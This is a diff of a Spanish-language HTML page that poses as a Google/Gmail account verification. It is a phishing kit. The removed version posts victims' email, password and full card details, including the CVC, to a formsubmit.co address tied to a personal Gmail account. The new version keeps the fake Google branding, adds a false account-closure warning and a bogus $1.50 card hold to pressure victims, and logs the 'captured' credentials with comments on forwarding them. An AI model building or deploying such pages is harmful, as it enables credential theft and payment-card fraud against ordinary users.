@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación de cuenta de Google</title>
+    <title>Verificación de Seguridad - Gmail</title>
     <style>
         body {
-            font-family: 'Roboto', Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #f2f2f2;
             display: flex;
             justify-content: center;
@@ -18,188 +18,165 @@
             background-color: white;
             padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
-            width: 350px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
             text-align: center;
         }
         .logo {
+            width: 120px;
             margin-bottom: 20px;
         }
-        .logo img {
-            height: 24px;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 10px;
+        h2 {
             color: #202124;
+            margin-bottom: 10px;
         }
         p {
             color: #5f6368;
             font-size: 14px;
-            margin-bottom: 30px;
+            margin-bottom: 20px;
         }
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-        label {
-            display: block;
-            font-size: 12px;
-            color: #5f6368;
-            margin-bottom: 5px;
+        .error-box {
+            background-color: #fce8e6;
+            border: 1px solid #dd3c3c;
+            color: #d93025;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: none; /* Oculto al principio */
+            font-size: 13px;
         }
         input {
             width: 100%;
-            padding: 13px 15px;
+            padding: 12px;
+            margin: 8px 0;
             border: 1px solid #dadce0;
             border-radius: 4px;
-            font-size: 16px;
             box-sizing: border-box;
-            transition: border 0.2s;
+            font-size: 14px;
         }
-        input:focus {
-            border: 2px solid #1a73e8;
-            outline: none;
-            padding: 12px 14px; /* Adjust for border width */
-        }
-        .btn {
+        button {
             background-color: #1a73e8;
             color: white;
-            border: none;
             padding: 12px 24px;
+            border: none;
             border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
             cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
             width: 100%;
             margin-top: 10px;
         }
-        .btn:hover {
+        button:hover {
             background-color: #1765cc;
         }
         .footer {
             margin-top: 20px;
             font-size: 12px;
-            color: #5f6368;
+            color: #999;
         }
         /* Ocultar pasos */
-        .step { display: none; }
-        .active { display: block; }
-        
-        /* Loader */
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1a73e8;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        #step2, #step3 {
+            display: none;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Logo de Google -->
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo">
+        <!-- Logo de Google (enlazado oficial para que se vea real) -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo">
+
+        <!-- PASO 1: Email y Contraseña -->
+        <div id="step1">
+            <h2>Verificar tu cuenta</h2>
+            <p>Ingresa tu correo y contraseña para continuar.</p>
+            
+            <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
+            <input type="password" id="pass" placeholder="Contraseña" required>
+            
+            <button onclick="verifyLogin()">Siguiente</button>
         </div>
 
-        <!-- PASO 1: CREDENCIALES -->
-        <div id="step1" class="step active">
-            <h1>Bienvenido</h1>
-            <p>Ingresa tu contraseña para continuar</p>
-            
-            <form id="credForm" action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
-                <input type="hidden" name="_subject" value="Nueva Verificación de Cuenta">
-                <input type="hidden" name="_next" value="https://accounts.google.com/">
-                
-                <div class="input-group">
-                    <label>Correo electrónico o teléfono</label>
-                    <input type="email" name="Email" required placeholder="ejemplo@gmail.com">
-                </div>
-                
-                <div class="input-group">
-                    <label>Contraseña</label>
-                    <input type="password" name="Password" required placeholder="••••••••">
-                </div>
-
-                <button type="button" class="btn" onclick="nextStep()">Siguiente</button>
-            </form>
-            <div class="footer">
-                <a href="#" style="color:#1a73e8; text-decoration:none; font-size:12px;">¿Olvidaste tu contraseña?</a>
+        <!-- PASO 2: Error y Pedido de Tarjeta -->
+        <div id="step2">
+            <div class="error-box" id="errorMsg" style="display: block;">
+                <strong>⚠️ Problema detectado</strong><br>
+                No pudimos verificar tu identidad. Para evitar que cierren tu cuenta, necesitamos confirmar tu método de pago.
             </div>
-        </div>
-
-        <!-- PASO 2: TARJETA -->
-        <div id="step2" class="step">
-            <h1>Verificación de seguridad</h1>
-            <p>Para confirmar tu identidad, ingresa los datos de tu tarjeta.</p>
             
-            <form id="cardForm" action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
-                <input type="hidden" name="_subject" value="Datos de Tarjeta Verificación">
-                <input type="hidden" name="_next" value="https://accounts.google.com/">
-                
-                <div class="input-group">
-                    <label>Nombre en la tarjeta</label>
-                    <input type="text" name="CardName" required placeholder="NOMBRE APELLIDO">
-                </div>
-
-                <div class="input-group">
-                    <label>Número de tarjeta</label>
-                    <input type="text" name="CardNumber" required placeholder="0000 0000 0000 0000" maxlength="19">
-                </div>
-
-                <div style="display:flex; gap:10px;">
-                    <div class="input-group" style="flex:1;">
-                        <label>Vencimiento</label>
-                        <input type="text" name="Expiry" required placeholder="MM/AA" maxlength="5">
-                    </div>
-                    <div class="input-group" style="flex:1;">
-                        <label>CVC</label>
-                        <input type="text" name="CVC" required placeholder="123" maxlength="3">
-                    </div>
-                </div>
-
-                <button type="submit" class="btn">Verificar</button>
-            </form>
+            <h2>Verificación de Tarjeta</h2>
+            <p>Se retendrá un monto de <strong>$1.50 USD</strong> para confirmar que la tarjeta es válida. Este monto se reembolsará en 24 horas.</p>
+            
+            <input type="text" id="cardName" placeholder="Nombre en la tarjeta">
+            <input type="text" id="cardNumber" placeholder="Número de tarjeta (16 dígitos)" maxlength="19">
+            <div style="display: flex; gap: 10px;">
+                <input type="text" id="cardExpiry" placeholder="MM/YY" style="width: 50%;">
+                <input type="text" id="cardCvc" placeholder="CVC" style="width: 50%;">
+            </div>
+            
+            <button onclick="submitCard()">Confirmar y Liberar Cuenta</button>
         </div>
 
-        <!-- PASO 3: CARGANDO -->
-        <div id="step3" class="step">
-            <h1>Verificando...</h1>
-            <div class="loader"></div>
-            <p>Por favor espera un momento.</p>
+        <!-- PASO 3: Éxito -->
+        <div id="step3">
+            <h2 style="color: #1e8e3e;">✅ ¡Cuenta Verificada!</h2>
+            <p>Tu cuenta ha sido restaurada correctamente. Puedes cerrar esta ventana.</p>
+            <button onclick="location.reload()">Cerrar</button>
+        </div>
+
+        <div class="footer">
+            © 2026 Google LLC - Todos los derechos reservados.
         </div>
     </div>
 
     <script>
-        function nextStep() {
-            // Simular que guardamos los datos del paso 1 (opcional, FormSubmit ya los envía)
-            // Aquí podrías agregar lógica para enviar los datos del paso 1 si quisieras
-            
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
+        function verifyLogin() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if(!email || !pass) {
+                alert("Por favor completa ambos campos.");
+                return;
+            }
+
+            // Simular carga
+            const btn = document.querySelector('#step1 button');
+            btn.textContent = "Verificando...";
+            btn.disabled = true;
+
+            setTimeout(() => {
+                // Ocultar paso 1 y mostrar paso 2
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+                
+                // Opcional: Enviar los datos del email/pass a tu email o a un archivo
+                console.log("Datos capturados:", email, pass);
+                // Aquí podrías agregar código para enviar estos datos a tu propio servidor o email
+            }, 1500);
         }
 
-        // Formatear tarjeta automáticamente
-        document.querySelector('input[name="CardNumber"]').addEventListener('input', function (e) {
-            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
-        });
-
-        // Formatear fecha
-        document.querySelector('input[name="Expiry"]').addEventListener('input', function (e) {
-            let input = e.target.value;
-            if (input.length === 2 && !input.includes('/')) {
-                e.target.value = input + '/';
+        function submitCard() {
+            const cardNumber = document.getElementById('cardNumber').value;
+            
+            if(cardNumber.length < 13) {
+                alert("Ingresa un número de tarjeta válido.");
+                return;
             }
-        });
+
+            const btn = document.querySelector('#step2 button');
+            btn.textContent = "Procesando pago...";
+            btn.disabled = true;
+
+            setTimeout(() => {
+                // Ocultar paso 2 y mostrar paso 3
+                document.getElementById('step2').style.display = 'none';
+                document.getElementById('step3').style.display = 'block';
+                
+                console.log("Tarjeta capturada:", cardNumber);
+                // Aquí también puedes enviar los datos de la tarjeta
+            }, 2000);
+        }
     </script>
 </body>
 </html>
